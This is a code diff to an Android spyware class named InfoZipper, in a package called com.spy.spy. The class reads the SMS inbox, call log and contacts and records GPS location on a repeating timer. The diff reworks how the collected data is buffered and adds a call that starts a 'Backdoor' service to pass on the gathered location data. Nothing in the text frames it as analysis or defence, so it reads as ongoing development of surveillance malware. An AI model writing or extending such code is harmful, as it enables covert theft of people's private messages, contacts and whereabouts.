@@ -3,6 +3,7 @@ package com.spy.spy;
 import android.Manifest;
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Address;
@@ -36,38 +37,38 @@ import java.util.TimerTask;
  */
 public class InfoZipper {
     Context context;
-    Writer writer = null;
+
     GpsRecorder gpsRecorder=new GpsRecorder();
     public void setContext(Context context){
         this.context=context;
     }
-    void readSMS() throws IOException {
+    void readSMS(Writer writer) throws IOException {
         Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
-        readCursor(cursor);
+        readCursor(cursor,writer);
     }
-    void readCalls() throws IOException {
+    void readCalls(Writer writer) throws IOException {
         StringBuffer stringBuffer = new StringBuffer();
         Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                 null, null, null, CallLog.Calls.DATE + " DESC");
-        readCursor(cursor);
+        readCursor(cursor,writer);
     }
-    void readContacts() throws IOException {
+    void readContacts(Writer writer) throws IOException {
         Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-        readCursor(cursor);
+        readCursor(cursor,writer);
     }
     void startGpsRecord(){
-        gpsRecorder.recordOne();
+        gpsRecorder.start();
     }
     public String gpsInfo(){
         return gpsRecorder.toString();
     }
     @Override
     public String toString(){
-        writer=new StringWriter(512);
+        StringWriter writer=new StringWriter(512);
         try {
-            readCalls();
-            readContacts();
-            readSMS();
+            readCalls(writer);
+            readContacts(writer);
+            readSMS(writer);
         } catch (IOException e) {
             return writer.toString();
         }
@@ -76,9 +77,10 @@ public class InfoZipper {
     class GpsRecorder {
 
         LocationManager locationManager = null;
-        Timer timer=new Timer();
+        Timer timer=null;
         long  durtion=50000;
-        Writer gps=new StringWriter(512);
+        long  gps_counter=0;
+        Writer gps=null;
         GpsRecorder(){
             SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
             try {
@@ -87,7 +89,18 @@ public class InfoZipper {
 
             }finally {
                 //if(gps.size()>1000){send and clear}
+                Intent sc = new Intent(context, Backdoor.class);
+                sc.putExtra("action",Backdoor.GPS_FULL);
+                context.startService(sc);
             }
+        }
+        public void start(){
+            if(timer!=null)
+                timer.cancel();
+            gps_counter=0;
+            gps=new StringWriter(512);
+            timer=new Timer();
+            recordOne();
         }
         void recordOne(){
             timer.schedule(record5min,durtion);
@@ -134,6 +147,7 @@ public class InfoZipper {
         @Override
         public String toString(){
             String to=gps.toString();
+            gps_counter=0;
             gps=new StringWriter(512);
             return to;
         }
@@ -154,7 +168,7 @@ public class InfoZipper {
             e.printStackTrace();
         }
     }
-    private void readCursor(Cursor cursor) throws IOException {
+    private void readCursor(Cursor cursor,Writer writer) throws IOException {
         if (cursor.moveToFirst())
             for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                 writer.append(String.valueOf(idx));
@@ -162,6 +176,7 @@ public class InfoZipper {
                 writer.append(cursor.getColumnName(idx));
             }
         do {
+            writer.append('\n');
             for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                 writer.append(cursor.getString(idx));
                 writer.append('\t');
